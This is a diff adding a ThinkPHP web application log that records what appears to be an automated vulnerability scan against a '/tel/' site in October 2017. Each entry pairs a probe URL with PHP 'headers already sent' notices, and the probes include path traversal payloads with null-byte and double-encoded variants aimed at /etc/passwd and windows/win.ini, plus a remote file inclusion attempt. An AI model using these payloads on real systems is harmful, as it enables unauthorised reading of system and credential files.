@@ -1,0 +1,32 @@
+[ 2017-10-23T08:47:43+08:00 ] 118.192.48.6 /tel/index.php?s=http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg
+NOTIC: [2] Cannot modify header information - headers already sent by (output started at /data/home/qxu1650190128/htdocs/tel/home/Conf/config.php:1) /data/home/qxu1650190128/htdocs/tel/ThinkPHP/Common/functions.php 第 802 行.
+NOTIC: [2] Cannot modify header information - headers already sent by (output started at /data/home/qxu1650190128/htdocs/tel/home/Conf/config.php:1) /data/home/qxu1650190128/htdocs/tel/ThinkPHP/Common/functions.php 第 804 行.
+
+[ 2017-10-23T08:47:43+08:00 ] 118.192.48.6 /tel/index.php?s=1some_inexistent_file_with_long_name%00.jpg
+NOTIC: [2] Cannot modify header information - headers already sent by (output started at /data/home/qxu1650190128/htdocs/tel/home/Conf/config.php:1) /data/home/qxu1650190128/htdocs/tel/ThinkPHP/Common/functions.php 第 802 行.
+NOTIC: [2] Cannot modify header information - headers already sent by (output started at /data/home/qxu1650190128/htdocs/tel/home/Conf/config.php:1) /data/home/qxu1650190128/htdocs/tel/ThinkPHP/Common/functions.php 第 804 行.
+
+[ 2017-10-23T08:47:45+08:00 ] 118.192.48.6 /tel/index.php?s=http://testasp.vulnweb.com/t/fit.txt%3F.jpg
+NOTIC: [2] Cannot modify header information - headers already sent by (output started at /data/home/qxu1650190128/htdocs/tel/home/Conf/config.php:1) /data/home/qxu1650190128/htdocs/tel/ThinkPHP/Common/functions.php 第 802 行.
+NOTIC: [2] Cannot modify header information - headers already sent by (output started at /data/home/qxu1650190128/htdocs/tel/home/Conf/config.php:1) /data/home/qxu1650190128/htdocs/tel/ThinkPHP/Common/functions.php 第 804 行.
+
+[ 2017-10-23T08:47:45+08:00 ] 118.192.48.6 /tel/index.php?s=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.jpg
+NOTIC: [2] Cannot modify header information - headers already sent by (output started at /data/home/qxu1650190128/htdocs/tel/home/Conf/config.php:1) /data/home/qxu1650190128/htdocs/tel/ThinkPHP/Common/functions.php 第 802 行.
+NOTIC: [2] Cannot modify header information - headers already sent by (output started at /data/home/qxu1650190128/htdocs/tel/home/Conf/config.php:1) /data/home/qxu1650190128/htdocs/tel/ThinkPHP/Common/functions.php 第 804 行.
+
+[ 2017-10-23T08:47:46+08:00 ] 118.192.48.6 /tel/index.php?s=../../../../../../../../../../etc/passwd%00.jpg
+NOTIC: [2] Cannot modify header information - headers already sent by (output started at /data/home/qxu1650190128/htdocs/tel/home/Conf/config.php:1) /data/home/qxu1650190128/htdocs/tel/ThinkPHP/Common/functions.php 第 802 行.
+NOTIC: [2] Cannot modify header information - headers already sent by (output started at /data/home/qxu1650190128/htdocs/tel/home/Conf/config.php:1) /data/home/qxu1650190128/htdocs/tel/ThinkPHP/Common/functions.php 第 804 行.
+
+[ 2017-10-23T08:47:46+08:00 ] 118.192.48.6 /tel/index.php?s=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.jpg
+NOTIC: [2] Cannot modify header information - headers already sent by (output started at /data/home/qxu1650190128/htdocs/tel/home/Conf/config.php:1) /data/home/qxu1650190128/htdocs/tel/ThinkPHP/Common/functions.php 第 802 行.
+NOTIC: [2] Cannot modify header information - headers already sent by (output started at /data/home/qxu1650190128/htdocs/tel/home/Conf/config.php:1) /data/home/qxu1650190128/htdocs/tel/ThinkPHP/Common/functions.php 第 804 行.
+
+[ 2017-10-23T08:47:46+08:00 ] 118.192.48.6 /tel/index.php?s=/../..//../..//../..//../..//../..//etc/passwd%00.jpg
+NOTIC: [2] Cannot modify header information - headers already sent by (output started at /data/home/qxu1650190128/htdocs/tel/home/Conf/config.php:1) /data/home/qxu1650190128/htdocs/tel/ThinkPHP/Common/functions.php 第 802 行.
+NOTIC: [2] Cannot modify header information - headers already sent by (output started at /data/home/qxu1650190128/htdocs/tel/home/Conf/config.php:1) /data/home/qxu1650190128/htdocs/tel/ThinkPHP/Common/functions.php 第 804 行.
+
+[ 2017-10-23T08:47:52+08:00 ] 118.192.48.6 /tel/index.php?s=../../../../../../../../../../windows/win.ini%00.jpg
+NOTIC: [2] Cannot modify header information - headers already sent by (output started at /data/home/qxu1650190128/htdocs/tel/home/Conf/config.php:1) /data/home/qxu1650190128/htdocs/tel/ThinkPHP/Common/functions.php 第 802 行.
+NOTIC: [2] Cannot modify header information - headers already sent by (output started at /data/home/qxu1650190128/htdocs/tel/home/Conf/config.php:1) /data/home/qxu1650190128/htdocs/tel/ThinkPHP/Common/functions.php 第 804 行.
+
